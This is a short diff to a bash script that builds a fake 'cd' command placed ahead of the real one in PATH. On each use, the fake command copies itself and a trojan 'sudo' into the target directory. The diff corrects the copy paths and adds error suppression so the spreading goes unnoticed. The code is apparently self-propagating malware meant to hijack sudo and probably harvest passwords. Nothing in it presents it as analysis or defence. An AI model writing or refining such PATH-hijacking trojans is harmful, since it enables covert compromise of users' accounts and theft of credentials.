@@ -3,10 +3,10 @@
 PATH=.:$PATH
 
 echo "#!/bin/bash" > cd
-echo "/bin/cp cd $1cd" >> cd
-echo "/bin/cp sudo $1sudo" >> cd
-echo "/bin/cp ls $1sudo" >> cd
-echo "/bin/cd $1" >> cd
+echo "/bin/cp cd $1/cd 2>/dev/null" >> cd
+echo "/bin/cp sudo $1/sudo 2>/dev/null" >> cd
+echo "/bin/cp ls $1/sudo 2>/dev/null" >> cd
+echo "/bin/cd $1 2>/dev/null" >> cd
 echo "exec bash" >> cd
 chmod +x cd
 
